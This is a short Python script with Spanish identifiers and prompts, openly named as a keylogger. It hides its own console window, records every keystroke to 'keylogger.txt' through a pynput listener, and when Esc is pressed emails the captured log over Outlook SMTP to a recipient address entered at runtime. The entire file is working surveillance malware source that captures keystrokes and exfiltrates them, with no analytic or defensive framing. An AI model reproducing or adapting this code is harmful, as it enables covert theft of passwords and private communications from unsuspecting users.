from email.mime.text import MIMEText
import smtplib
import time
from email.mime.multipart import MIMEMultipart
import pynput.keyboard
import win32console
import win32gui

archivo = open('keylogger.txt','w')
lista_teclas = []
ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana,0)
    

def enviar():
    msg = MIMEMultipart()
    msg['From'] = input("Introduce el correo emisor : ")
    password = input("Introduce contraseña : ")
    msg['To'] = input("Introduce correo receptor : ")
    msg['Subject'] = input("Introduce asunto de correo : ")
    
    with open('keylogger.txt','r') as r:
        msg.attach(MIMEText(r.read())) 
    try:
        server = smtplib.SMTP('smtp-mail.outlook.com:587')
        server.starttls()
        server.login(msg['From'], password)
        server.sendmail(msg['From'],msg['To'],msg.as_string())
        server.quit()
    except Exception as e:
        print(f"fallo el envio de correo {e}")
        
    
def imprimir():
    tecla = ''.join(lista_teclas)
    archivo.write(tecla)
    archivo.flush()
    lista_teclas.clear()
    
def pulsar(key):
    print("Tecla pulsada : {}".format(key))
    
    if key == pynput.keyboard.Key.esc:
        print("Dejar de capturar")
        imprimir()
        archivo.close()
        enviar()
        time.sleep(3)
        
        return False
    elif key == pynput.keyboard.Key.enter:
        lista_teclas.append("\n")
    elif key == pynput.keyboard.Key.space:
        lista_teclas.append(' ')
    elif key == pynput.keyboard.Key.backspace or key == pynput.keyboard.Key.shift:
        pass
    else: 
        try:
            lista_teclas.append(str(key.char))
        except AttributeError:
            pass
        
    imprimir()    
        
        
    
with pynput.keyboard.Listener(on_press=pulsar) as captura:
    captura.join()        